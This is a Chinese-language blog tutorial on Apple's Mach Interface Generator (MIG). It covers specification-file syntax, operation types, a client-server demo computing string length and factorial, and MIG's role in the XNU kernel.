<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> * import header-file;  </span></span><br><span class="line"><span class="comment"> * uimport header-file;  </span></span><br><span class="line"><span class="comment"> * simport header-file;  </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"></span><br><span class="line">import <span class="string">&quot;foo.h&quot;</span>;      <span class="comment">/* imported in both modules */</span> </span><br><span class="line">uimport &lt;stdlib.h&gt;;  <span class="comment">/* only in user-interface module */</span> </span><br><span class="line">simport &lt;stdio.h&gt;;   <span class="comment">/* only in server-interface module */</span></span><br></pre></td></tr></table></figure>

<h3 id="1-1-5-Operation-descriptions"><a href="#1-1-5-Operation-descriptions" class="headerlink" title="1.1.5 Operation descriptions"></a>1.1.5 Operation descriptions</h3><p>操作描述包含一个或多个类型的IPC操作的规范。规范包括描述操作种类的关键字，操作的名称，以及参数的名称和类型。当MIG编译规范文件时，它会为每个操作生成客户和服务器存根。客户端存根存在于用户界面模块中。它的工作是打包并发送与客户程序中的过程调用对应的消息。服务器存根驻留在服务器界面模块中。它对收到的消息进行解包，并调用程序员的服务器代码来实现该操作。</p>
<p>MIG支持的操作类型包括例程、简单例程、程序、简单程序和函数。</p>
<table>
<thead>
<tr>
<th>Operation Type</th>
<th>Reply Received?</th>
<th>Error Returned?</th>
</tr>
</thead>
<tbody><tr>
<td><code>Routine</code></td>
<td>Yes</td>
<td>Yes, a <code>kern_return_t</code> return value specifying whether the operation was successfully completed</td>
</tr>
<tr>
<td><code>SimpleRoutine</code></td>
<td>No</td>
<td>Yes, the return value from Mach’s message-sending primitive</td>
</tr>
<tr>
<td><code>Procedure</code></td>
<td>Yes</td>
<td>No</td>
</tr>
<tr>
<td><code>SimpleProcedure</code></td>
<td>No</td>
<td>No</td>
</tr>
<tr>
<td><code>Function</code></td>
<td>Yes</td>
<td>No error code returned, but a value from the server function is returned</td>
</tr>
</tbody></table>
<p>操作声明的例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">routine <span class="title function_">vm_allocate</span><span class="params">(target_task:<span class="type">vm_task_entry_t</span>; inout address:<span class="type">vm_address_t</span>; size:<span class="type">vm_size_t</span>; flags:<span class="type">int</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>一个参数说明包含一个名称和一个类型，并且可以选择用一个关键字in、out或inout来装饰，分别代表该参数只发送给服务器，或由服务器在离开时发送，或两者都发送。</p>
<p>在操作部分，skip关键字会使MIG跳过下一个操作ID的分配，导致操作ID序列中出现漏洞。这对于在接口发展过程中保持兼容性很有帮助。</p>
<h3 id="1-1-6-Options-declarations"><a href="#1-1-6-Options-declarations" class="headerlink" title="1.1.6 Options declarations"></a>1.1.6 Options declarations</h3><p>选项声明用于指定影响生成代码的特殊目的或全局选项。下面是一些选项的例子：</p>
<ul>
<li><p><code>WaitTime</code>用于指定用户界面代码等待从服务器收到回复的最长时间，单位为毫秒。</p>
</li>
<li><p><code>MsgType</code>用于设置消息类型（例如，将消息标记为加密的）。</p>
</li>
<li><p><code>UserPrefix</code>用于指定一个字符串，该字符串将是调用IPC操作的客户端函数名称的前缀。</p>
</li>
<li><p><code>ServerPrefix</code>用于指定一个字符串，它将是实现IPC操作的服务器端函数名称的前缀。</p>
</li>
<li><p><code>Rcsid</code>用于指定一个字符串，它将导致在服务器和用户模块中分别声明名为<code>Sys_server_rcsid</code>和<code>Sys_user_rcsid</code>的静态字符串变量，它们的常量值都是指定的字符串。</p>
</li>
</ul>
<p>更多关于MIG规范文件的例子可以查看<code>/usr/include/mach/</code>及其子目录。</p>
<h1 id="0x2-Demo"><a href="#0x2-Demo" class="headerlink" title="0x2 Demo"></a>0x2 Demo</h1><p>接下来使用MIG创建一个简单的客户-服务器系统。</p>
<p>MIG服务器是一个Mach任务，使用MIG生成的RPC接口向其客户提供服务。MIG服务器则提供两个例程：一个是计算客户端发送的字符串的长度，另一个是计算客户端发送的数字的阶乘。在这个例子中，客户端将内联发送字符串，而服务器将只发送简单的整数。回顾一下，当一个接口调用返回<code>out-of-line</code>数据时，调用者有责任通过调用vm_deallocate()来取消内存分配。例如，我们可以给我们的接口添加另一个操作，比如说，将客户端发送的字符串反转，并通过在调用者的地址空间为其分配内存来返回反转的字符串。</p>
<p>源代码由以下四个文件组成：</p>
<ul>
<li><p>一个头文件包含了客户端和服务器端使用的有用定义和原型（<code>misc_types.h</code>）。</p>
</li>
<li><p>MIG规范文件（<code>misc.defs</code>）。</p>
</li>
<li><p>服务器的设置和主循环(<code>server.c</code>)</p>
</li>
<li><p>接口的演示（<code>client.c</code>）</p>
</li>
</ul>
<p>下面给出了通用头文件。我们定义了两个新的数据类型：<code>input_string_t</code>，它是一个大小为64个元素的字符数组；<code>xput_number_t</code>，它是<code>int</code>的别名。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// misc_types.h </span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _MISC_TYPES_H_ </span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> _MISC_TYPES_H_ </span></span><br><span class="line">  <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line">  <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line">  <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line">  <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mach/mach.h&gt;</span> </span></span><br><span class="line">  <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;servers/bootstrap.h&gt;</span> <span class="comment">// The server port will be registered under this name. </span></span></span><br><span class="line">  <span class="meta">#<span class="keyword">define</span> MIG_MISC_SERVICE <span class="string">&quot;MIG-miscservice&quot;</span> <span class="comment">// Data representations </span></span></span><br><span class="line">  <span class="keyword">typedef</span> <span class="type">char</span> <span class="type">input_string_t</span>[<span class="number">64</span>]; </span><br><span class="line">  <span class="keyword">typedef</span> <span class="type">intxput_number_t</span>; </span><br><span class="line">  <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">mach_msg_header_t</span> head; </span><br><span class="line">    <span class="comment">// The following fields do not represent the actual layout of the request     </span></span><br><span class="line">    <span class="comment">// and reply messages that MIG will use. However, a request or reply     </span></span><br><span class="line">    <span class="comment">// message will not be larger in size than the sum of the sizes of these     </span></span><br><span class="line">    <span class="comment">// fields. We need the size to put an upper bound on the size of an     </span></span><br><span class="line">    <span class="comment">// incoming message in a mach_msg() call.     </span></span><br><span class="line">    NDR_record_t NDR;     </span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">      <span class="type">input_string_t</span> <span class="built_in">string</span>;</span><br><span class="line">      xput_number_tnumber;</span><br><span class="line">    &#125; data;     </span><br><span class="line">    <span class="type">kern_return_t</span> RetCode;</span><br><span class="line">    <span class="type">mach_msg_trailer_t</span> trailer;</span><br><span class="line">  &#125; <span class="type">msg_misc_t</span>; </span><br><span class="line">  <span class="type">xput_number_t</span> <span class="title function_">misc_translate_int_to_xput_number_t</span><span class="params">(<span class="type">int</span>)</span>; </span><br><span class="line">  <span class="type">int</span> <span class="title function_">misc_translate_xput_number_t_to_int</span><span class="params">(<span class="type">xput_number_t</span>)</span>; </span><br><span class="line">  <span class="type">void</span> <span class="title function_">misc_remove_reference</span><span class="params">(<span class="type">xput_number_t</span>)</span>; </span><br><span class="line">  <span class="type">kern_return_t</span> <span class="title function_">string_length</span><span class="params">(<span class="type">mach_port_t</span>, <span class="type">input_string_t</span>, <span class="type">xput_number_t</span> *)</span>; </span><br><span class="line">  <span class="type">kern_return_t</span> <span class="title function_">factorial</span><span class="params">(<span class="type">mach_port_t</span>, <span class="type">xput_number_t</span>, <span class="type">xput_number_t</span> *)</span>; </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line"><span class="comment">// _MISC_TYPES_H_</span></span><br></pre></td></tr></table></figure>

<p>下面给出了规范文件。注意<code>xput_number_t</code>的类型说明。每个MIG类型最多可以有三个对应的C类型：一个用于用户界面模块的类型（由<code>CUserType</code>选项指定），一个用于服务器模块的类型（由<code>CServerType</code>选项指定），以及一个供服务器例程内部使用的转换类型。如果<code>CType</code>选项与<code>CUserType</code>和<code>CServerType</code>的类型相同，可以用它来代替。在我们的例子中，<code>CType</code>选项指定了MIG类型<code>xput_number_t</code>的C数据类型。</p>
<figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">/*  </span><br><span class="line"> * A &quot;Miscellaneous&quot; Mach Server  </span><br><span class="line"> */ </span><br><span class="line">/*  </span><br><span class="line"> * <span class="keyword">File</span>:    misc.defs  </span><br><span class="line"> * Purpose: Miscellaneous Server subsystem definitions  </span><br><span class="line"> */ </span><br><span class="line">/*  </span><br><span class="line"> * Subsystem identifier  </span><br><span class="line"> */ </span><br><span class="line">Subsystem misc <span class="number">500</span>; </span><br><span class="line">/*  </span><br><span class="line"> * <span class="keyword">Type</span> declarations  </span><br><span class="line"> */ </span><br><span class="line">#include &lt;mach/std_types.defs&gt; </span><br><span class="line">#include &lt;mach/mach_types.defs&gt; </span><br><span class="line"><span class="keyword">type</span> input_string_t = <span class="keyword">array</span>[<span class="number">64</span>] <span class="keyword">of</span> char; </span><br><span class="line"><span class="keyword">type</span> xput_number_t = int CType:int InTran:xput_number_t misc_translate_int_to_xput_number_t(int)          OutTran:int misc_translate_xput_number_t_to_int(xput_number_t)</span><br><span class="line"><span class="function"><span class="keyword">Destructor</span>:</span>misc_remove_reference(xput_number_t); </span><br><span class="line">/*  </span><br><span class="line"> * Import declarations  </span><br><span class="line"> */  </span><br><span class="line">import &quot;misc_types.h&quot;; </span><br><span class="line">/*  </span><br><span class="line"> * Operation descriptions  </span><br><span class="line"> */</span><br><span class="line">/* This should be operation <span class="string">#500</span> */ </span><br><span class="line">routine string_length(server_port:mach_port_t; <span class="keyword">in</span> instring:input_string_t; <span class="keyword">out</span> len:xput_number_t); </span><br><span class="line">/* Create some holes <span class="keyword">in</span> operation sequence */ </span><br><span class="line">Skip; </span><br><span class="line">Skip; </span><br><span class="line">Skip; </span><br><span class="line">/* This should be operation <span class="string">#504</span>, <span class="keyword">as</span> there are three Skip<span class="string">&#x27;s */ </span></span><br><span class="line"><span class="string">routine factorial(server_port:mach_port_t; in num:xput_number_t; out fac:xput_number_t);</span></span><br><span class="line"><span class="string">/*  </span></span><br><span class="line"><span class="string"> * Option declarations  </span></span><br><span class="line"><span class="string"> */ </span></span><br><span class="line"><span class="string">ServerPrefix Server_; </span></span><br><span class="line"><span class="string">UserPrefix Client_;</span></span><br></pre></td></tr></table></figure>

<p>我们使用<code>InTran</code>、<code>OutTran</code>和<code>Destructor</code>选项来指定我们将为翻译和取消分配提供的程序。当一个类型必须被服务器和客户端以不同的方式看待时，转换是非常有用的。在我们的例子中，我们希望有关的类型对服务器来说是<code>xput_number_t</code>，对客户端来说是<code>int</code>。我们使用<code>InTran</code>指定 <code>misc_translate_int_to_xput_number_t()</code> 作为该类型的传入翻译程序。同样地，<code>misc_translate_xput_number_t_to_int()</code>是输出的翻译例程。由于<code>xput_number_t</code>在我们的例子中实际上只是<code>int</code>的另一个名字，我们的翻译函数是微不足道的：它们只是打印一条信息。</p>
<p>内核大量使用了翻译函数。</p>
<p>我们还使用<code>Destructor</code>选项来指定一个MIG将在适当时候调用的取消分配函数。服务器源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// server.c </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;misc_types.h&quot;</span> </span></span><br><span class="line"><span class="type">static</span> <span class="type">mach_port_t</span> server_port; </span><br><span class="line"><span class="keyword">extern</span> <span class="type">boolean_t</span> <span class="title function_">misc_server</span><span class="params">(<span class="type">mach_msg_header_t</span> *inhdr, <span class="type">mach_msg_header_t</span> *outhdr)</span>; </span><br><span class="line"><span class="type">void</span> <span class="title function_">server_setup</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">	<span class="type">kern_return_t</span> kr;</span><br><span class="line">	<span class="keyword">if</span> ((kr = bootstrap_create_service(bootstrap_port, MIG_MISC_SERVICE, &amp;server_port)) != BOOTSTRAP_SUCCESS)&#123;         		mach_error(<span class="string">&quot;bootstrap_create_service:&quot;</span>, kr);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;     </span><br><span class="line">	<span class="keyword">if</span> ((kr = bootstrap_check_in(bootstrap_port, MIG_MISC_SERVICE, &amp;server_port)) != BOOTSTRAP_SUCCESS) &#123;         		mach_port_deallocate(mach_task_self(), server_port);</span><br><span class="line">		mach_error(<span class="string">&quot;bootstrap_check_in:&quot;</span>, kr);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="type">void</span> <span class="title function_">server_loop</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">	mach_msg_server(misc_server, <span class="comment">// call the server-interface module </span></span><br><span class="line">	<span class="keyword">sizeof</span>(<span class="type">msg_misc_t</span>),          <span class="comment">// maximum receive size</span></span><br><span class="line">	server_port,                 <span class="comment">// port to receive on </span></span><br><span class="line">	MACH_MSG_TIMEOUT_NONE); <span class="comment">// options </span></span><br><span class="line">&#125; <span class="comment">// InTran </span></span><br><span class="line"><span class="type">xput_number_t</span> <span class="title function_">misc_translate_int_to_xput_number_t</span><span class="params">(<span class="type">int</span> param)</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;misc_translate_incoming(%d)\n&quot;</span>, param);</span><br><span class="line">	<span class="keyword">return</span> (<span class="type">xput_number_t</span>)param; </span><br><span class="line">&#125; <span class="comment">// OutTran </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">misc_translate_xput_number_t_to_int</span><span class="params">(<span class="type">xput_number_t</span> param)</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;misc_translate_outgoing(%d)\n&quot;</span>, (<span class="type">int</span>)param);</span><br><span class="line">	<span class="keyword">return</span> (<span class="type">int</span>)param; </span><br><span class="line">&#125; <span class="comment">// Destructor </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">misc_remove_reference</span><span class="params">(<span class="type">xput_number_t</span> param)</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;misc_remove_reference(%d)\n&quot;</span>, (<span class="type">int</span>)param); </span><br><span class="line">&#125; <span class="comment">// an operation that we export </span></span><br><span class="line"><span class="type">kern_return_t</span> <span class="title function_">string_length</span><span class="params">(<span class="type">mach_port_t</span> server_port, <span class="type">input_string_t</span> instring, <span class="type">xput_number_t</span> *len)</span> &#123;</span><br><span class="line">	<span class="type">char</span> *in = (<span class="type">char</span> *)instring;</span><br><span class="line">	<span class="keyword">if</span> (!in || !len)</span><br><span class="line">		<span class="keyword">return</span> KERN_INVALID_ADDRESS;</span><br><span class="line">	*len = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (*in++)</span><br><span class="line">		(*len)++;</span><br><span class="line">	<span class="keyword">return</span> KERN_SUCCESS; </span><br><span class="line">&#125; <span class="comment">// an operation that we export </span></span><br><span class="line"><span class="type">kern_return_t</span> <span class="title function_">factorial</span><span class="params">(<span class="type">mach_port_t</span> server_port, <span class="type">xput_number_t</span> num, <span class="type">xput_number_t</span> *fac)</span> &#123;     </span><br><span class="line">	<span class="type">int</span> i;     </span><br><span class="line">	<span class="keyword">if</span> (!fac)</span><br><span class="line">		<span class="keyword">return</span> KERN_INVALID_ADDRESS;</span><br><span class="line">	*fac = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">2</span>; i &lt;= num; i++)</span><br><span class="line">		*fac *= i;     </span><br><span class="line">	<span class="keyword">return</span> KERN_SUCCESS; </span><br><span class="line">&#125; </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">	server_setup(); </span><br><span class="line">	server_loop(); </span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面给出了程序员提供的，将用来调用服务器接口例程的客户端的源代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// client.c </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;misc_types.h&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INPUT_STRING <span class="string">&quot;Hello, MIG!&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INPUT_NUMBER 5 </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  <span class="type">kern_return_t</span> kr;</span><br><span class="line">  <span class="type">mach_port_t</span> server_port;</span><br><span class="line">  <span class="type">int</span>  len, fac;</span><br><span class="line">  <span class="comment">// look up the service to find the server&#x27;s port</span></span><br><span class="line">  <span class="keyword">if</span> ((kr = bootstrap_look_up(bootstrap_port, MIG_MISC_SERVICE, &amp;server_port)) != BOOTSTRAP_SUCCESS) &#123;         </span><br><span class="line">    mach_error(<span class="string">&quot;bootstrap_look_up:&quot;</span>, kr);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;     </span><br><span class="line">  <span class="comment">// call a procedure </span></span><br><span class="line">  <span class="keyword">if</span> ((kr = string_length(server_port, INPUT_STRING, &amp;len)) != KERN_SUCCESS)         </span><br><span class="line">    mach_error(<span class="string">&quot;string_length:&quot;</span>, kr); </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;length of \&quot;%s\&quot; is %d\n&quot;</span>, INPUT_STRING, len);</span><br><span class="line">  <span class="comment">// call another procedure     </span></span><br><span class="line">  <span class="keyword">if</span> ((kr = factorial(server_port, INPUT_NUMBER, &amp;fac)) != KERN_SUCCESS)</span><br><span class="line">    mach_error(<span class="string">&quot;factorial:&quot;</span>, kr);</span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;factorial of %d is %d\n&quot;</span>, INPUT_NUMBER, fac);</span><br><span class="line">  mach_port_deallocate(mach_task_self(), server_port);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来，我们必须在规范文件上运行MIG程序。如图所示，我们将client.c和miscUser.c编译并连接在一起，得到客户端程序。同样地，server.c和miscServer.c产生了服务器程序。</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/202203271602.png" alt="202203271602" style="zoom: 25%;" />

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -m </span><br><span class="line">	client.c, misc.defs, misc_types.h, server.c </span><br><span class="line">$ mig -v misc.defs </span><br><span class="line">	Subsystem misc:base = 500 </span><br><span class="line">	Type int8_t = (9, 8) </span><br><span class="line">	Type uint8_t = (9, 8) </span><br><span class="line">	... </span><br><span class="line">	Type input_string_t = array [64] of (8, 8) </span><br><span class="line">	Type xput_number_t = (2, 32)</span><br><span class="line">	CUserType: int</span><br><span class="line">	CServerType: int</span><br><span class="line">	InTran: xput_number_t misc_translate_int_to_xput_number_t(int)</span><br><span class="line">	OutTran: int misc_translate_xput_number_t_to_int(xput_number_t)</span><br><span class="line">	Destructor: misc_remove_reference(xput_number_t) </span><br><span class="line">	Import <span class="string">&quot;misc_types.h&quot;</span> </span><br><span class="line">	Routine (0) string_length( </span><br><span class="line">		RequestPort server_port: mach_port_t </span><br><span class="line">		In instring: input_string </span><br><span class="line">		Out len: xput_number) </span><br><span class="line">	Routine (4) factorial( </span><br><span class="line">		RequestPort server_port: mach_port_t </span><br><span class="line">		In num: xput_number </span><br><span class="line">		Out fac: xput_number) </span><br><span class="line">	ServerPrefix Server_ </span><br><span class="line">	UserPrefix Client_ </span><br><span class="line">	Writing misc.h ... <span class="keyword">done</span>. </span><br><span class="line">	Writing miscUser.c ... <span class="keyword">done</span>. </span><br><span class="line">	Writing miscServer.c ... <span class="keyword">done</span>. </span><br><span class="line">$ <span class="built_in">ls</span> -m </span><br><span class="line">		client.c, misc.defs, misc.h, miscServer.c, miscUser.c, misc_types.h, server.c </span><br><span class="line">$ gcc -Wall -o server server.c miscServer.c </span><br><span class="line">$ gcc -Wall -o client client.c miscUser.c </span><br><span class="line">$ ./server</span><br></pre></td></tr></table></figure>

<p>一旦服务器运行，我们也可以使用我们的 <code>bootstrap_info</code> 程序来验证我们的服务名称（MIG-miscservice，定义在 misc_types.h 中）是否被列出。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ bootstrap_info </span><br><span class="line">	... 1   MIG-miscservice                                                 - </span><br><span class="line">$ ./client </span><br><span class="line">	length of <span class="string">&quot;Hello, MIG!&quot;</span> is 11 factorial of 5 is 120</span><br></pre></td></tr></table></figure>

<p>下图显示了客户端调用服务器的<code>string_length()</code>操作时发生的动作序列：</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/202203271624.png" alt="202203271624" style="zoom:25%;" />

<h1 id="0x3-内核中的MIG"><a href="#0x3-内核中的MIG" class="headerlink" title="0x3 内核中的MIG"></a>0x3 内核中的MIG</h1><p>MIG被用来实现大多数Mach的系统调用。一些系统调用，如与任务相关的、与IPC相关的和与VM相关的调用，将目标任务作为其参数之一。MIG根据面向内核的数据类型，在每种情况下翻译任务参数。例如，Mach线程在用户空间中被看作是一个端口名，但在内核中，MIG调用<code>convert_port_to_thread()</code>（osfmk&#x2F;kern&#x2F;ipc_tt.c）将传入的线程端口名转换为指向<code>porta thread</code>结构体所代表的内核对象的指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* osfmk/mach/mach_types.defs */</span> </span><br><span class="line">type <span class="type">thread_t</span> = <span class="type">mach_port_t</span> </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> KERNEL_SERVER</span></span><br><span class="line">  intran: <span class="type">thread_t</span> convert_port_to_thread(<span class="type">mach_port_t</span>)</span><br><span class="line">  outtran: <span class="type">mach_port_t</span> convert_thread_to_port(<span class="type">thread_t</span>)</span><br><span class="line">  destructor: thread_deallocate(<span class="type">thread_t</span>) </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  <span class="comment">/* KERNEL_SERVER */</span></span></span><br></pre></td></tr></table></figure>

<p>注意<code>KERNEL_SERVER</code>条件指令。Mac OS X内核在MIG规范文件中使用它和一个相关的指令<code>KERNEL_USER</code>来指定<code>KernelServer</code>和<code>KernelUser</code>子系统的修改器。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* osfmk/mach/task.defs */</span></span><br><span class="line">subsystem </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> KERNEL_SERVER</span></span><br><span class="line">	KernelServer </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* KERNEL_SERVER */</span></span></span><br><span class="line">task <span class="number">3400</span>;</span><br></pre></td></tr></table></figure>

<p>子系统修改器指示MIG为用户和服务器模块生成特殊环境下的备用代码。例如，当一个MIG服务器例程驻留在内核中时，它被称为在<code>KernelServer</code>环境中。尽管该例程的原型与没有<code>KernelServer</code>修饰符的情况下相同，但后者改变了MIG执行类型转换的方式。在<code>KernelServer</code>子系统的服务器端，一个<code>mach_port_t</code>类型会自动转换为内核类型<code>ipc_port_t</code>。</p>
<h2 id="3-1-内核对象的接口"><a href="#3-1-内核对象的接口" class="headerlink" title="3.1 内核对象的接口"></a>3.1 内核对象的接口</h2><p>Mach不仅使用端口来表示几种类型的内核对象，而且还通过Mach IPC导出这些对象的接口。这些接口也是用MIG实现的。用户程序可以通过Mach IPC直接使用这些接口，或者，通常情况下，通过调用标准库函数。当系统库被编译时，它链接了与几个内核对象MIG定义文件相对应的用户接口模块。库的构建过程是在定义文件上运行mig，以生成接口模块。</p>
<p>内核对象类型的例子包括<code>thread</code>、<code>task</code>、<code>host</code>、<code>processor</code>、<code>processor set</code>、<code>memory object</code>、<code>semaphore</code>、<code>lock set</code>和<code>clock</code>。定义的内核对象类型的完整列表在<code>osfmk/kern/ipc_kobject.h</code>中。</p>
